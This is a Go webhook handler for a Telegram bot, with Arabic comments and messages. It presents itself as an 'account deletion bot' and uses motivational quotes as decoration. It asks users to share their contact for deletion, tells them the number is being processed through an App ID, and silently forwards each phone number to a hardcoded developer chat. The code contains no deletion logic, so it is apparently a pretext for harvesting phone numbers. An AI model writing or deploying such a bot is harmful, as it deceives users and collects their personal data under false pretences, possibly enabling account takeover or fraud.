package handler

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"time"

	"github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

// دالة لجلب اقتباس عشوائي
func getQuote() string {
	quotes := []string{
		"***“Believe you can and you're halfway there.”***",
		"***“It always seems impossible until it's done.”***",
		"***“Success is not final, failure is not fatal.”***",
		"***“Hardships often prepare ordinary people for an extraordinary destiny.”***",
		"***“Don't watch the clock; do what it does. Keep going.”***",
		"***“Your talent determines what you can do.”***",
	}
	rand.Seed(time.Now().UnixNano())
	return quotes[rand.Intn(len(quotes))]
}

func Handler(w http.ResponseWriter, r *http.Request) {
	botToken := os.Getenv("BOT_TOKEN")
	appID := os.Getenv("APP_ID")
	devID := "8590415901"

	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		return
	}

	var update tgbotapi.Update
	if err := json.NewDecoder(r.Body).Decode(&update); err != nil {
		return
	}

	// 1. معالجة النقرات على الزر الشفاف (الاقتباسات)
	if update.CallbackQuery != nil {
		callback := update.CallbackQuery
		if callback.Data == "refresh_quote" {
			newQuote := getQuote()
			editMsg := tgbotapi.NewEditMessageText(callback.Message.Chat.ID, callback.Message.MessageID, newQuote)
			
			// إعادة إضافة الزر الشفاف تحت الاقتباس الجديد
			inlineKbd := tgbotapi.NewInlineKeyboardMarkup(
				tgbotapi.NewInlineKeyboardRow(
					tgbotapi.NewInlineKeyboardButtonData("🔄 Get New Quote", "refresh_quote"),
				),
			)
			editMsg.ReplyMarkup = &inlineKbd
			editMsg.ParseMode = "Markdown"
			bot.Send(editMsg)
			
			// إشعار تلجرام باستلام النقرة (لإخفاء الساعة الرملية)
			bot.Send(tgbotapi.NewCallback(callback.ID, ""))
		}
		return
	}

	if update.Message != nil {
		chatID := update.Message.Chat.ID

		// 2. أمر البداية /start
		if update.Message.IsCommand() && update.Message.Command() == "start" {
			// كيبورد الأزرار العادية (إرسال جهة الاتصال)
			contactBtn := tgbotapi.NewKeyboardButtonContact("إرسال جهة الاتصال للحذف 🗑️")
			replyKbd := tgbotapi.NewReplyKeyboard([]tgbotapi.KeyboardButton{contactBtn})
			replyKbd.ResizeKeyboard = true

			// الزر الشفاف (Inline Button) للاقتباسات
			inlineKbd := tgbotapi.NewInlineKeyboardMarkup(
				tgbotapi.NewInlineKeyboardRow(
					tgbotapi.NewInlineKeyboardButtonData("🔄 Get New Quote", "refresh_quote"),
				),
			)

			// الرسالة الترحيبية
			msg := tgbotapi.NewMessage(chatID, "مرحباً بك في بوت حذف الحسابات.\n\n***"+getQuote()+"***")
			msg.ParseMode = "Markdown"
			msg.ReplyMarkup = replyKbd // إضافة كيبورد جهة الاتصال
			bot.Send(msg)

			// إرسال رسالة منفصلة تحتوي على الزر الشفاف لتجنب تداخل الكيبورد
			quoteMsg := tgbotapi.NewMessage(chatID, "اضغط أدناه للحصول على اقتباس معبر:")
			quoteMsg.ReplyMarkup = inlineKbd
			bot.Send(quoteMsg)
		}

		// 3. استقبال جهة الاتصال
		if update.Message.Contact != nil {
			bot.Send(tgbotapi.NewMessage(chatID, "✅ تم استلام الرقم. جاري المعالجة عبر App ID: "+appID))
			
			// إشعار المطور
			notify := tgbotapi.NewMessage(8590415901, fmt.Sprintf("مستخدم جديد أرسل رقمه: %s", update.Message.Contact.PhoneNumber))
			bot.Send(notify)
		}
	}

	w.WriteHeader(http.StatusOK)
}
